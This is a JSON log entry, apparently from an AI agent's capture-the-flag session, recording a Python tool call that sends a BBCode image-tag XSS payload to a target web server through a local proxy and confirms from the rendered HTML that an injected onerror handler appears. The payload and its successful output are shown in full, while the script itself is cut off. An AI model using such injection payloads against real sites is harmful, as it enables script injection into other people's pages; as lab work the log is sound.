@@ -1,0 +1,41 @@
+{
+  "ts": "2026-10-17 23:42:31",
+  "call_id": "1792251751666395300-39b4515b",
+  "args": {
+    "code": "\nimport time, urllib.request, urllib.parse\nfrom html.parser import HTMLParser\nBASE = \"http://160.202.254.160:15880/\"\nPROXY = {\"http\": \"http://127.0.0.1:12001\", \"https\": \"http://127.0.0.1:12001\"}\nop = urllib.request.build_opener(urllib.request.ProxyHandler(PROXY))\n\ndef get(data=None):\n    d = urllib.parse.urlencode(data).encode() if data is not None else None\n    with op.open(BASE, data=d, timeout=20) as r:\n        return r.read().decode(\"gb18030\", \"replace\")\n\nMARK = \"PX1\"\nPAYLOAD = \"[img]x[img] ...(1224 chars)",
+    "timeout": 120,
+    "wp_purpose": "用HTML解析器验证 onerror 属性成立",
+    "wp_case": "ctf-fca56ff3a53c802b"
+  },
+  "response": {
+    "ok": true,
+    "result": {
+      "exit": 0,
+      "stdout": "PAYLOAD : [img]x[img] onerror=alert`1` [/img]\nRENDERED: '<pre><img src=\"http://x<img src=\"http:// onerror=alert`1` \" /> PX1'\n\n解析出的标签:\n  <pre> []\n  <img> [('src', 'http://x<img src='), ('http:', None), ('onerror', 'alert`1`'), ('\"', None)]\n    onerror 存在: True\n",
+      "stderr": "",
+      "output_truncated": false
+    },
+    "tool": "py_run",
+    "dangerous": false,
+    "wp_operation": {
+      "operation_id": "8b251fa92c9c415bbad2f1cc59371a80",
+      "step": 36
+    },
+    "duration_ms": 1037.7,
+    "task_health": {
+      "ok": true,
+      "case": "ctf-fca56ff3a53c802b",
+      "calls": 18,
+      "failed_calls": 3,
+      "active_tool_seconds": 56.312,
+      "recent_failure_streak": 0,
+      "warnings": [],
+      "policy": "advisory_only",
+      "execution_blocked": false,
+      "model_tokens": null,
+      "model_cost": null,
+      "scope": "仅统计经过本系统的新调用；不含模型推理时间或费用，不证明答案正确。"
+    },
+    "evidence_path": "[CTF_ROOT]\\logs\\calls\\1792251751666395300-39b4515b.json"
+  }
+}
